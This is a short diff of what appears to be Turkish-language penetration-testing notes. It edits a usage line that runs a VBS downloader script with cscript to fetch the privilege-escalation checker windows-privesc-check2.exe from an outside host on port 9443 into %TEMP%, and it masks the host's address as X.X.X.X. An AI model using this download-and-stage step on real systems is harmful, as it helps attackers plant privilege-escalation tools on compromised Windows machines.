@@ -28,7 +28,7 @@ echo ts.Close >> WindowsWgetAraci.vbs
 
 type WindowsWgetAraci.vbs
 
-How start command : cscript WindowsWgetAraci.vbs http://10.100.50.140:9443/windows-privesc-check2.exe %TEMP%\YetkiYukseltmeZafiyetiAra.exe
+How start command : cscript WindowsWgetAraci.vbs http://X.X.X.X:9443/windows-privesc-check2.exe %TEMP%\YetkiYukseltme.exe
 
 # Github
 
